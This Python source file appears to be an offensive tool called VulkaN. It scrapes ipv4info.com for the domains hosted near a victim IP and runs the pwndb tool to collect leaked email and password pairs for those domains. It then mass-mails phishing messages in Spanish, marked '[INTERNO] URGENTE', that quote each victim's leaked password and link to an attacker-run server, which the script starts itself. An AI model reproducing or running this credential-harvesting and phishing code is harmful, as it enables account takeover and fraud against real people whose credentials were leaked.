import os
import time
import general
from bs4 import BeautifulSoup
import requests
import urllib
import re
import tldextract
import send_mail
import sys
from ipwhois import IPWhois
import socket
from shutil import which

TAM = 0.10
SERVER = 'http://192.168.1.196'
PORT = '2337'

class VulkaN:

    def __init__(self, victim, num_domains, generate_files, deploy_white_lists, whois):
        self.victim = victim
        self.num_domains = num_domains
        self.generate_files = generate_files
        self.url = f'http://ipv4info.com/?act=check&ip={self.victim}'
        self.domains_list = []
        self.credentials_list = []
        self.white_lists_list = []
        self.deploy_white_lists = deploy_white_lists
        self.whois = whois



    def extract_info(self):
        '#Check URL tipo string'


        if type(self.url) is not str:
            return

        ''' Section scrapping blocks '''
        len_block_list = []
        page = urllib.request.urlopen(self.url)
        soup = BeautifulSoup(page, 'html.parser')

        for links in soup.findAll('a', attrs={'href': re.compile("^/domains-in-block")}):
            split = links.get('href').split('/')
            self.white_lists_list.append(split[3])
            len_block_list.append(links)


        dns_dictionary = {}

        len_list = int(len(len_block_list) * TAM)
        len_list = len_list if len_list > 1 else 1
        if len_list > 1 and len_list <= 5:
            len_list = len_list
        elif len_list > 5:
            len_list = 5
        else:
            len_list = 1

        for i in range(self.num_domains):
            open_blocks = urllib.request.urlopen('http://ipv4info.com' + len_block_list[i].get('href'))
            soup_links = BeautifulSoup(open_blocks, 'html.parser')
            dns = soup_links.findAll('a', attrs={'href': re.compile('^/dns')})
            for dip in dns:
                split = dip.contents[0].replace('\n', '')
                extract = tldextract.extract(split)
                key = extract.domain + '.' + extract.suffix
                if key in dns_dictionary:
                    dns_dictionary[key] += 1
                else:
                    dns_dictionary[key] = 1

        self.domains_list.extend(sorted(dns_dictionary.items(), key=lambda x: x[1], reverse=True))


    #No se puede implementar hasta que vaya pwndb -> Multiprocessing y guardar en credentials.txt
    def extract_credentials(self):
        location = str(os.system('locate pwndb.py'))
        result = ''.join([i for i in location if not i.isdigit()])
        '''Deberíamos utilizar result como directorio general'''

        for i in range(self.num_domains):
            print(self.domains_list[i][0])
            os.system('python3 ~/Escritorio/pwndb/pwndb.py --target @' + self.domains_list[i][0])

    def send_phising_mail(self):
        ''' Take in mind that pwndb format is mail:password '''
        credential_list = []
        try:
            with open(self.victim + '/credentials.txt', 'r', encoding='UTF-8') as f:
                for line in f.readlines():
                    credential_list.append((line.replace('\r', '').replace('\n', '').split(':')))
        except FileNotFoundError:
            print('Failed opening credentials', sys.exc_info()[0], "occurred")


        try:
            for credential in credential_list:
                subject = '[INTERNO] URGENTE ' + credential[0] + ' se han filtrado tus credenciales'
                body = 'Hola ' + credential[0] + ',\n\neste es un mensaje automático, la siguiente dirección IP: "176.59.192.1" ha accedido con ' + credential[0] + ' y ' + credential[1] + ', si no has sido tú, te aconsejamos cambiar la contraseña siguiendo las instrucciones en el siguiente enlace: ' + SERVER + ':' + PORT
                msg = (f'Subject: {subject}\n\n{body}').encode('utf-8')
                send_mail.send_mail(credential[0], msg)
        except:
            print('Failed sending massive phising mails', sys.exc_info()[0], "occurred")

    '''Launch server'''
    @staticmethod
    def wake_up_server():
        try:
            os.system('python -m SimpleHTTPServer' + str(PORT) + ' &')
        except OSError:
            print('Failed trying to launch server ', sys.exc_info()[0], ' occurred')





    def save_info(self):
        if self.generate_files:
            try:
                general.create_project_dir(self.victim)
                general.create_data_files(self.victim, self.domains_list, self.credentials_list, self.white_lists_list, self.whois)
            except:
                print('Failed creating folders', sys.exc_info()[0], "occurred")

    def __str__(self):
        try:
            return self.domains_list[:self.num_domains].__str__() + self.credentials_list.__str__() +  self.white_lists_list.__str__()
        except TypeError:
            return 1
